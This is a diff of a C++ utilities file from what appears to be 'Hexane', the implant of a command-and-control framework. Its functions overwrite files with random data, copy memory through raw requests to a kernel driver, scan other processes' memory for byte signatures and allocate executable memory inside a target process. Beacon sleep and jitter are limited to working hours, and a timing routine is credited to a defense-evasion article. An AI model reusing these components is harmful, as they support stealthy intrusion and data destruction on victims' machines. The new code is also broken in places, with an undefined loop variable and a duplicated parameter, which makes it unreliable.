@@ -1,123 +1,110 @@
-#include <core/include/utils.hpp>
+#ifndef HEXANE_UTILS_HPP
+#define HEXANE_UTILS_HPP
+
 using namespace Modules;
 using namespace Utils::Random;
 
 namespace Utils {
-
-	BOOL WriteToDisk(const wchar_t *path, const uint8_t* data, size_t size) {
-		HEXANE;
-
-		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	BOOL WriteToDisk(CONST WCHAR *path, CONST UINT8* data, SIZE_T size) {
+		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (handle == INVALID_HANDLE_VALUE) {
 			return false;
 		}
 
 		DWORD write = 0;
-		BOOL result = ctx->win32.WriteFile(handle, data, (DWORD) size, &write, NULL);
+		BOOL result = Ctx->Win32.WriteFile(handle, data, (DWORD)size, &write, NULL);
 
-		ctx->win32.NtClose(handle);
+		Ctx->Win32.NtClose(handle);
 		return (result && write == size);
 	}
 
-	BOOL ReadFromDisk(const wchar_t* path, uint8_t* data, size_t size) {
-		HEXANE; 
-
-		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+	BOOL ReadFromDisk(CONST WCHAR* path, UINT8* data, SIZE_T size) {
+		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (handle == INVALID_HANDLE_VALUE) {
 			return false;
 		}
 
 		DWORD read = 0;
-		BOOL result = ctx->win32.ReadFile(handle, data, (DWORD) size, &read, NULL);
+		BOOL result = Ctx->Win32.ReadFile(handle, data, (DWORD) size, &read, NULL);
 
 		ctx->win32.NtClose(handle);
 		return (result && read == size);
 	}
 
-	BOOL DestroyFileData(const wchar_t* path, size_t size) {
-		HEXANE;
+	BOOL DestroyFileData(CONST WCHAR* path, SIZE_T size) {
+		BOOL success    = false;
+		UINT8 *rndData 	= nullptr;
+		INT newLength   = 0;
+		DWORD write 	= 0;
 
-		bool success     = false;
-		uint8 *rand_data = nullptr;
-		int new_length   = 0;
-
-		DWORD write = 0;
-		HANDLE handle = ctx->win32.CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+		HANDLE handle = Ctx->Win32.CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 		if (handle == INVALID_HANDLE_VALUE) {
 			goto defer;
 		}
 
-		new_length = size + ((intptr_t) RandomNumber32() * (intptr_t) RandomNumber32()) % 2000000 + 1000;
-	
-		rand_data = (uint8*) ctx->win32.RtlAllocateHeap(ctx->heap, HEAP_ZERO_MEMORY, new_length);
-		if (!rand_data) {
+		newLength = size + ((INT_PTR) RandomNumber32() * (INT_PTR) RandomNumber32()) % 2000000 + 1000;
+		rndData = (UINT8*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, HEAP_ZERO_MEMORY, newLength);
+
+		if (!rndData) {
 			ctx->win32.NtClose(handle);
 			goto defer;
 		}
 
-		for (size_t i = 0; i < new_length; i++) {
-			rand_data[i] = (uint8)(RandomNumber32() % 255);
+		for (SIZE_T idx = 0; i < newLength; idx++) {
+			rndData[idx] = (UINT8) (RandomNumber32() % 255);
 		}
-		if (!ctx->win32.WriteFile(handle, rand_data, new_length, &write, NULL) || write != new_length) {
+		if (!Ctx->Win32.WriteFile(handle, rndData, newLength, &write, NULL) || write != newLength) {
 			// LOG ERROR
 			goto defer;
 		} 
 
 		success = true;
-
-	defer:
-		if (rand_data) {
-			ctx->win32.RtlFreeHeap(ctx->heap, 0, rand_data);
+defer:
+		if (rndData) {
+			Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, rndData);
 		}
 		if (handle) {
-			ctx->win32.NtClose(handle);
+			Ctx->Win32.NtClose(handle);
 		}
 
 		return success;
 	}
 
-	PVOID FindRelativeAddress(HANDLE handle, void *offset, uint32 offset_offset, uint32 offset_size) {
-		HEXANE;
+	PVOID FindRelativeAddress(HANDLE handle, LPVOID offset, UINT32 offset, UINT32 nOffset) {
+		UINT_PTR instr = (UINT_PTR) offset;
+		INT32 ripOffset = 0;
 
-		uintptr_t instr = (uintptr_t) offset;
-		int32 rip_offset = 0;
-
-		if (!NT_SUCCESS(ntstatus = ctx->win32.NtReadVirtualMemory(handle, (void*)instr + offset_offset, &rip_offset, sizeof(int32), nullptr))) {
+		Ctx->Ntstatus = Ctx->Win32.NtReadVirtualMemory(handle, (LPVOID)instr + offset, &ripOffset, sizeof(int32), nullptr);
+		if (!NT_SUCCESS(Ctx->Ntstatus)) {
 			return nullptr;
 		}
 
-		return (void*) (instr + offset_size + rip_offset);
+		return (LPVOID) (instr + nOffset + ripOffset);
 	}
 
-	VOID AppendBuffer(uint8_t **buffer, const uint8_t *const target, uint32_t *capacity, const uint32_t length) {
-        HEXANE;
-
-        const auto new_buffer = B_PTR(Realloc(*buffer, *capacity + length));
-        if (!new_buffer) {
+	VOID AppendBuffer(UINT8** buffer, CONST UINT8 *CONST target, UINT32 *capacity, CONST UINT32 length) {
+        const auto newBuffer = (PBYTE) Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, *buffer, *capacity + length);
+        if (!newBuffer) {
             return;
         }
 
-        *buffer = new_buffer;
-        MemCopy(B_PTR(*buffer) + *capacity, (void*) target, length);
+        *buffer = newBuffer;
+        MemCopy((PBYTE) *buffer + *capacity, (LPVOID) target, length);
         *capacity += length;
     }
 
-    VOID AppendPointerList(void **array[], void *pointer, uint32_t *count) {
-        HEXANE;
-
-        const auto new_list = (void**) Realloc(*array, (*count + 1) * sizeof(void*));
-        if (!new_list) {
+    VOID AppendPointerList(VOID** array[], VOID* pointer, UINT32* count) {
+        const auto newList = (VOID**) Ctx->Win32.RtlReAllocateHeap(Ctx->Heap, 0, *array, (*count + 1) * sizeof(LPVOID));
+        if (!newList) {
             return;
         }
 
-        *array = new_list;
+        *array = newList;
         (*array)[*count] = pointer;
         (*count)++;
     }
 
-	BOOL ReadMemory(HANDLE handle, void *dst, void *src, uintptr_t size) {
-		HEXANE;
-
+	BOOL ReadMemory(HANDLE handle, VOID* dst, VOID* src, UINT_PTR size) {
 		if (!dst || !src || !size) {
 			return false;
 		}
@@ -126,17 +113,15 @@ namespace Utils {
 		DWORD read = 0;
 
 		buffer.case_number = 0x33;
-		buffer.source = (uintptr_t) src;
-		buffer.destination = (uintptr_t) dst;
+		buffer.source = (UINT_PTR) src;
+		buffer.destination = (UINT_PTR) dst;
 		buffer.length = size;
 
-		return ctx->win32.DeviceIoControl(handle, IOCTL1, &buffer, sizeof(buffer), nullptr, 0, &read, nullptr);
+		return Ctx->Win32.DeviceIoControl(handle, IOCTL1, &buffer, sizeof(buffer), nullptr, 0, &read, nullptr);
 	}
 
     namespace Scanners {
-
-        BOOL MapScan(_hash_map* map, uint32_t id, void** pointer) {
-
+        BOOL MapScan(HASH_MAP* map, UINT32 id, VOID** pointer) {
             for (auto i = 0;; i++) {
                 if (!map[i].name) { break; }
 
@@ -145,28 +130,25 @@ namespace Utils {
                     return true;
                 }
             }
-
             return false;
         }
 
 
-        UINT_PTR RelocateExport(void* const process, const void* const target, size_t size) {
-            HEXANE;
+		UINT_PTR RelocateExport(VOID* CONST process, CONST VOID* CONST target, SIZE_T size) {
+			UINT_PTR ret       = 0;
+			const auto address  = (UINT_PTR) target;
 
-            uintptr_t ret       = 0;
-            const auto address  = (uintptr_t) target;
+			for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
+				Ctx->Ntstatus = Ctx->Win32.NtAllocateVirtualMemory(process, (VOID**) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ); 
 
-            for (ret = (address & ADDRESS_MAX) - VM_MAX; ret < address + VM_MAX; ret += 0x10000) {
-                if (!NT_SUCCESS(ctx->win32.NtAllocateVirtualMemory(process, (void **) &ret, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READ))) {
-                    ret = 0;
-                }
-            }
+				if (!NT_SUCCESS(Ctx->Ntstatus)) {
+					ret = 0;
+				}
+			}
+			return ret;
+		}
 
-            return ret;
-        }
-
-        BOOL SigCompare(const uint8_t* data, const char* signature, const char* mask) {
-
+        BOOL SigCompare(CONST UINT8* data, CONST CHAR* signature, CONST CHAR* mask) {
             while (*mask && ++mask, ++data, ++signature) {
                 if (*mask == 0x78 && *data != *signature) {
                     return false;
@@ -175,14 +157,16 @@ namespace Utils {
             return (*mask == 0x00);
         }
 
-        UINT_PTR SignatureScan(HANDLE handle, const uintptr_t base, const uint32_t size, const char* signature, const char* mask) {
-            HEXANE;
+        UINT_PTR SignatureScan(HANDLE handle, CONST UINT_PTR base, CONST UINT32 size, CONST CHAR* signature, CONST CHAR* mask) {
+            SIZE_T read   		= 0;
+            UINT_PTR address   	= 0;
 
-            size_t read         = 0;
-            uintptr_t address   = 0;
+            auto buffer = (UINT8*) Ctx->Win32.RtlAllocateHeap(Ctx->Heap, 0, size);
 
-            auto buffer = (uint8_t*) Malloc(size);
-            x_ntassert(ctx->win32.NtReadVirtualMemory(handle, (void*) base, buffer, size, &read));
+            Ctx->Ntstatus = Ctx->Win32.NtReadVirtualMemory(handle, (VOID*) base, buffer, size, &read);
+			if (!NT_SUCCESS(Ctx->Ntstatus)) {
+				goto defer;
+			}
 
             for (auto i = 0; i < size; i++) {
                 if (SigCompare(buffer + i, signature, mask)) {
@@ -192,18 +176,17 @@ namespace Utils {
             }
 
             MemSet(buffer, 0, size);
-
-        defer:
+defer:
             if (buffer) {
-				Free(buffer);
+				Ctx->Win32.RtlFreeHeap(Ctx->Heap, 0, buffer);
 			}
             return address;
         }
 
-		UINT_PTR SignatureScanSection(HANDLE handle, const char *sec_name, uintptr_t base, const char *signature, const char *mask) {
+		UINT_PTR SignatureScanSection(HANDLE handle, CONST CHAR *sxnName, UINT_PTR base, CONST CHAR *signature, CONST CHAR *mask) {
+			UINT32 size = 0;
+			UINT_PTR section = FindSection(sxnName, base, &size);
 
-			uint32 size = 0;
-			uintptr_t section = FindSection(sec_name, base, &size);
 			if (!section) {
 				return 0;
 			}
@@ -213,61 +196,54 @@ namespace Utils {
     }
 
     namespace Time {
-
         ULONG64 GetTimeNow() {
-            HEXANE;
+            FILETIME fileTime       = { };
+            LARGE_INTEGER largeInt  = { };
 
-            FILETIME file_time       = { };
-            LARGE_INTEGER large_int  = { };
+            Ctx->Win32.GetSystemTimeAsFileTime(&fileTime);
 
-            ctx->win32.GetSystemTimeAsFileTime(&file_time);
+            largeInt.LowPart    = fileTime.dwLowDateTime;
+            largeInt.HighPart   = (long) fileTime.dwHighDateTime;
 
-            large_int.LowPart    = file_time.dwLowDateTime;
-            large_int.HighPart   = (long) file_time.dwHighDateTime;
-
-            return large_int.QuadPart;
+            return largeInt.QuadPart;
         }
 
         BOOL InWorkingHours() {
-            HEXANE;
-
             SYSTEMTIME systime = { };
 
-            uint32_t work_hours = ctx->config.hours;
-            uint16_t start_time = (work_hours >> 16); 		
-            uint16_t end_time  	= (work_hours & 0xFFFF); 
+            UINT32 workHours = ctx->config.hours;
+            UINT16 startTime = (workHours >> 16); 		
+            UINT16 endTime  = (workHours & 0xFFFF); 
 
             // Decode the start time (HHMM)
-            uint16_t start_hour = start_time / 100;  
-            uint16_t start_min 	= start_time % 100;  
+            UINT16 startHour = startTime / 100;  
+            UINT16 startMin = startTime % 100;  
 
     		// Decode the end time (HHMM)
-    		uint16_t end_hour  	= end_time / 100;
-    		uint16_t end_min   	= end_time % 100;
+    		UINT16 endHour 	= endTime / 100;
+    		UINT16 endMin   = endTime % 100;
 
-    		ctx->win32.GetLocalTime(&systime);
+    		Ctx->Win32.GetLocalTime(&systime);
 
     		// Check if the current time is outside the working hours
-    		if ((systime.wHour < start_hour || systime.wHour > end_hour) ||
-        		(systime.wHour == start_hour && systime.wMinute < start_min) ||
-        		(systime.wHour == end_hour && systime.wMinute > end_min)) {
-        		return FALSE;
+    		if ((systime.wHour < startHour || systime.wHour > endHour) ||
+        		(systime.wHour == startHour && systime.wMinute < startMin) ||
+        		(systime.wHour == endHour && systime.wMinute > endMin)) {
+        		return false;
     		}
 
-    		return TRUE;
+    		return true;
 }
 
 
-        VOID Timeout(size_t ms) {
+        VOID Timeout(SIZE_T ms) {
             // Courtesy of Illegacy & Shubakki:
             // https://www.legacyy.xyz/defenseevasion/windows/2022/07/04/abusing-shareduserdata-for-defense-evasion-and-exploitation.html
-            HEXANE;
-
             auto defaultseed    = Utils::Random::RandomSeed();
-            auto seed           = ctx->win32.RtlRandomEx((ULONG*) &defaultseed);
+            auto seed           = Ctx->Win32.RtlRandomEx((ULONG*) &defaultseed);
 
-            volatile size_t x   = INTERVAL(seed);
-            const uintptr_t end = Utils::Random::Timestamp() + (x * ms);
+            volatile SIZE_T x   = INTERVAL(seed);
+            const UINT_PTR end 	= Utils::Random::Timestamp() + (x * ms);
 
             while (Random::Timestamp() < end) { x += 1; }
             if (Random::Timestamp() - end > 2000) {
@@ -277,38 +253,35 @@ namespace Utils {
     }
 
     namespace Random {
-
 		UINT32 RandomSleepTime() {
-		    HEXANE;
+			SYSTEMTIME systime = { };
 
-			SYSTEMTIME sys_time = { };
-
-			uint32_t work_hours = ctx->config.hours;
+			uint32_t workHours = ctx->config.hours;
 			uint32_t sleeptime  = ctx->config.sleeptime * 1000;
 			uint32_t variation  = (ctx->config.jitter * sleeptime) / 100;
 			uint32_t random     = 0;
 
-			uint16_t start_time = (work_hours >> 16);  		
-			uint16_t end_time   = (work_hours & 0xFFFF);  	
+			uint16_t startTime = (workHours >> 16);  		
+			uint16_t endTime   = (workHours & 0xFFFF);  	
 
-			uint16_t start_hour = start_time / 100;  
-			uint16_t start_min  = start_time % 100;  
-			uint16_t end_hour   = end_time / 100;
-			uint16_t end_min    = end_time % 100;
+			uint16_t startHour = startTime / 100;  
+			uint16_t startMin  = startTime % 100;  
+			uint16_t endHour   = endTime / 100;
+			uint16_t endMin    = endTime % 100;
 
-			ctx->win32.GetLocalTime(&sys_time);
+			Ctx->Win32.GetLocalTime(&systime);
 
 			if (!Time::InWorkingHours()) {  
 				if (sleeptime) {
 					sleeptime = 0;  
 
 					// get seconds until midnight, add time until start of next working day
-					if (sys_time.wHour > end_hour || (sys_time.wHour == end_hour && sys_time.wMinute > end_min)) {
-						sleeptime += (24 - sys_time.wHour - 1) * 60 + (60 - sys_time.wMinute);  
-						sleeptime += start_hour * 60 + start_min;  								
+					if (systime.wHour > endHour || (systime.wHour == endHour && systime.wMinute > endMin)) {
+						sleeptime += (24 - systime.wHour - 1) * 60 + (60 - systime.wMinute);  
+						sleeptime += startHour * 60 + startMin;  								
 					} 
 					else {
-						sleeptime += (start_hour - sys_time.wHour) * 60 + (start_min - sys_time.wMinute);
+						sleeptime += (startHour - systime.wHour) * 60 + (startMin - systime.wMinute);
 					}
 
 					sleeptime *= MS_PER_SECOND;  
@@ -329,7 +302,6 @@ namespace Utils {
 		}
 
         UINT32 RandomSeed() {
-
             return 'A2' * -40271 +
                    __TIME__[7] * 1 +
                    __TIME__[6] * 10 +
@@ -340,40 +312,34 @@ namespace Utils {
         }
 
         UINT_PTR Timestamp() {
+            LARGE_INTEGER time 		= { };
+            const SIZE_T epoch      = 0x019DB1DED53E8000;
+            const SIZE_T msTicks   	= 1000;
 
-            LARGE_INTEGER time      = { };
-            const size_t epoch      = 0x019DB1DED53E8000;
-            const size_t ms_ticks   = 1000;
+            time.u.LowPart  = *(UINT32*) 0x7FFE0000 + 0x14;
+            time.u.HighPart = *(INT32*) 0x7FFE0000 + 0x1c;
 
-            time.u.LowPart  = *(uint32_t*) 0x7FFE0000 + 0x14;
-            time.u.HighPart = *(int32_t*) 0x7FFE0000 + 0x1c;
-
-            return (time.QuadPart - epoch) / ms_ticks;
+            return (time.QuadPart - epoch) / msTicks;
         }
 
         UINT32 RandomNumber32() {
-		    HEXANE;
-
             auto seed = RandomSeed();
 
-            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
-            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
+            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);
+            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);
             seed = seed % (LONG_MAX - 2 + 1) + 2;
 
-            return seed % 2 == 0
-                   ? seed
-                   : seed + 1;
+            return seed % 2 == 0 ? seed : seed + 1;
         }
 
         BOOL RandomBool() {
-		    HEXANE;
-
             auto seed = RandomSeed();
 
             seed = RandomSeed();
-            seed = ctx->win32.RtlRandomEx((PULONG) &seed);
+            seed = Ctx->Win32.RtlRandomEx((PULONG) &seed);
 
             return seed % 2 == 0 ? TRUE : FALSE;
         }
     }
 }
+#endif // HEXANE_UTILS_HPP
